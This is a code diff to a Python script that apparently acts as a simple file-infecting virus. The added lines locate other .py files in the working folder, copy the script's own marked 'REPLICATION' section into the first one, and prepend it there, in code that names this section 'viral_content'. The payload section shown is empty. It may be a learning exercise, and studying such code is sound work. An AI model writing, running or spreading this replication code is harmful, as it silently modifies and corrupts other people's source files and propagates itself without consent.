@@ -17,15 +17,30 @@ selfname = os.path.basename(__file__)
 targets = glob.glob('*.py')
 targets.remove(selfname)
 
-f = open(targets[0], 'r')
-targetfile = f.readlines()
+with open(targets[0], 'r') as tr:
+    target_data = tr.readlines()
 
-f2 = open(selfname, 'r')
-selffile = f2.readlines()
+twrite = open(targets[0], 'w')
+
+f = open(selfname, 'r')
+selffile = f.readlines()
 
 index_start = selffile.index('### REPLICATION START ###\n')
-index_end = selffile.index('### REPLICATION END ###\n')
+index_end = selffile.index('### REPLICATION END ###\n') + 1
+viral_content = selffile[index_start:index_end]
+
+viral_content.append('\n')
+
+for x in target_data:
+    viral_content.append(x)
+
+for line in viral_content:
+    twrite.write(line)
+
+twrite.close()
+f.close()
 # Executed Payload Section
+
 ### REPLICATION END ###
 
 
@@ -38,5 +53,3 @@ for line in targetfile:
 for line in selffile:
 	print(line.replace('\n', ''))
 '''
-
-print(selffile[index_start:index_end])
